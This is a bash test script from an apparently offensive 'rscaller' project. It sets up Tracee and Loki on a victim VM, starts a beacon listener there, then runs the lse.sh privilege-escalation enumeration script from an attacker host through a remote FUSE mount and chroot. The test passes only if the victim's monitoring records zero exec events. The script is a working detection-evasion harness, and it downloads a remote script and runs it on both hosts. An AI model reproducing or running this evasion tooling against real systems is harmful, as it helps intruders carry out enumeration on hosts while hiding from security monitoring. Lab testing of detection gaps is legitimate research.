#!/usr/bin/env bash
# test_evasion_rscaller.sh — evasion proof: lse runs via rsc+rscfuse on attacker.
#
# lse.sh runs on REMOTE (attacker), chrooted into the rscfuse mount of CLONE (victim).
# Tracee on CLONE MUST see zero execve events — proves rscaller FS evasion works.
#
# Usage:
#   bash observability/test_evasion_rscaller.sh [remote] [clone]
#   EXEC_TIMEOUT=90 bash observability/test_evasion_rscaller.sh

set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/test_lib_rscaller.sh"

REMOTE="${1:-${REMOTE:-dev-vm-rscaller}}"
CLONE="${2:-${CLONE:-dev-vm-rscaller-clone}}"
REMOTE_DIR="${REMOTE_DIR:-/home/ubuntu/rscaller}"
EXEC_TIMEOUT="${EXEC_TIMEOUT:-90}"
BEACON_PORT="${BEACON_PORT:-9999}"
RSC_MOUNT="${RSC_MOUNT:-/rsc/default}"
BECOME_PASS="${BECOME_PASS:-ubuntu}"
TOOL_URL="https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh"
SETTLE_SECS="${SETTLE_SECS:-5}"
export TRACEE_EVENTS="${TRACEE_EVENTS:-execve,execveat}"

SUDO="echo $(printf '%q' "$BECOME_PASS") | sudo -S"
CLONE_IP="$(ssh "$CLONE" 'hostname -I 2>/dev/null' | awk '{print $1}')"
export LOKI_URL="http://${CLONE_IP}:3100"

echo "========================================"
echo " Observability test: rscaller evasion"
echo "========================================"
echo
log_info "Attacker (REMOTE) : $REMOTE"
log_info "Victim   (CLONE)  : $CLONE ($CLONE_IP)"
log_info "Tracee events     : $TRACEE_EVENTS"
log_info "Loki URL          : $LOKI_URL"
echo

# ── Start observability stack on victim ───────────────────────────────────────
COMPOSE_FILE="$SCRIPT_DIR/docker-compose.yml"

log_info "Deploying observability stack to $CLONE..."
ssh "$CLONE" "mkdir -p /tmp/rscaller-obs/config/loki /tmp/rscaller-obs/config/promtail"
scp -q "$COMPOSE_FILE"                              "$CLONE:/tmp/rscaller-obs/docker-compose.yml"
scp -q "$SCRIPT_DIR/config/loki/loki.yml"          "$CLONE:/tmp/rscaller-obs/config/loki/loki.yml"
scp -q "$SCRIPT_DIR/config/promtail/promtail.yml"  "$CLONE:/tmp/rscaller-obs/config/promtail/promtail.yml"

ssh "$CLONE" "
  cd /tmp/rscaller-obs
  TRACEE_EVENTS='${TRACEE_EVENTS}' docker compose up -d 2>&1 | tail -5
"

log_info "Waiting for Loki on ${CLONE_IP}:3100..."
for i in $(seq 1 60); do
  curl -sf "${LOKI_URL}/ready" >/dev/null 2>&1 && break || true
  sleep 1
done
curl -sf "${LOKI_URL}/ready" >/dev/null 2>&1 || { log_error "Loki not ready"; exit 1; }
log_info "Stack OK"

# ── Start rsbeacon on victim ──────────────────────────────────────────────────
log_info "Starting rsbeacon on $CLONE ($CLONE_IP:$BEACON_PORT)..."
ssh "$CLONE" "
  pkill rsbeacon 2>/dev/null || true; sleep 0.3
  nohup '${REMOTE_DIR}/target/release/rsbeacon' --listen '0.0.0.0:${BEACON_PORT}' \
    > /tmp/rsbeacon-evasion.log 2>&1 &
  sleep 0.5
  pgrep rsbeacon > /dev/null && echo '  rsbeacon: running' \
    || { echo 'rsbeacon failed'; exit 1; }
"

# ── Baseline: run test-sender normally — Tracee SHOULD see exec events ────────
log_info "Baseline: running lse.sh directly on $CLONE (confirm Tracee is active)..."
ssh "$CLONE" "
  curl -fsSL '${TOOL_URL}' -o /tmp/lse.sh 2>/dev/null; chmod +x /tmp/lse.sh
"
BL_START=$(now_ns)
ssh "$CLONE" "timeout 30 bash /tmp/lse.sh -l 0 -i 2>&1" | tail -3 || true
sleep "$SETTLE_SECS"

BL_COUNT=$(loki_event_count "$BL_START" "execve")
if (( BL_COUNT == 0 )); then
  log_warn "Baseline: Tracee saw 0 exec events — hooks may be inactive. Results may be unreliable."
else
  log_pass "Baseline OK — Tracee captured ${BL_COUNT} exec event(s)."
  print_events "$BL_START" "execve"
fi
echo

# ── rscaller run: lse via rsc+rscfuse on attacker — Tracee MUST see zero ─────
log_info "rscaller test: running lse.sh via rsc+rscfuse on $REMOTE (chroot into victim FS)..."
log_info "Command: rsc --beacon ${CLONE_IP}:${BEACON_PORT} -- chroot ${RSC_MOUNT} bash /tmp/lse.sh"

XDP_START=$(now_ns)
ssh "$REMOTE" "bash -s" << REMOTE_RUN
set -euo pipefail
curl -fsSL '${TOOL_URL}' -o /tmp/lse.sh 2>/dev/null; chmod +x /tmp/lse.sh

$SUDO timeout $((EXEC_TIMEOUT + 10)) \
  '${REMOTE_DIR}/target/release/rsc' \
    --beacon '${CLONE_IP}:${BEACON_PORT}' \
    --rscfuse '${REMOTE_DIR}/target/release/rscfuse' \
    -- bash -c "
      cp /tmp/lse.sh '${RSC_MOUNT}/tmp/lse.sh'
      timeout ${EXEC_TIMEOUT} chroot '${RSC_MOUNT}' bash /tmp/lse.sh -l 1 -i
    " 2>&1 | tail -5 || true
REMOTE_RUN

log_info "rsc finished. Waiting ${SETTLE_SECS}s for Loki to flush any late events..."
sleep "$SETTLE_SECS"

# ── Evaluate evasion ──────────────────────────────────────────────────────────
echo
log_info "Querying Loki for exec events on victim since rsc run..."
COUNT_EXEC=$(loki_event_count "$XDP_START" "execve")
COUNT_EXECAT=$(loki_event_count "$XDP_START" "execveat")
TOTAL=$(( COUNT_EXEC + COUNT_EXECAT ))

log_info "  execve  events on victim: ${COUNT_EXEC}"
log_info "  execveat events on victim: ${COUNT_EXECAT}"

if (( TOTAL == 0 )); then
  log_pass "Tracee captured 0 exec events during rscaller run."
  log_pass "rscaller FS evasion confirmed — lse.sh invisible to Tracee on victim."
  exit 0
else
  log_error "Tracee captured ${TOTAL} exec event(s) on victim (execve=${COUNT_EXEC}, execveat=${COUNT_EXECAT})."
  log_error "Expected 0 — tool activity is leaking through to the victim."
  print_events "$XDP_START" "execve"
  exit 1
fi
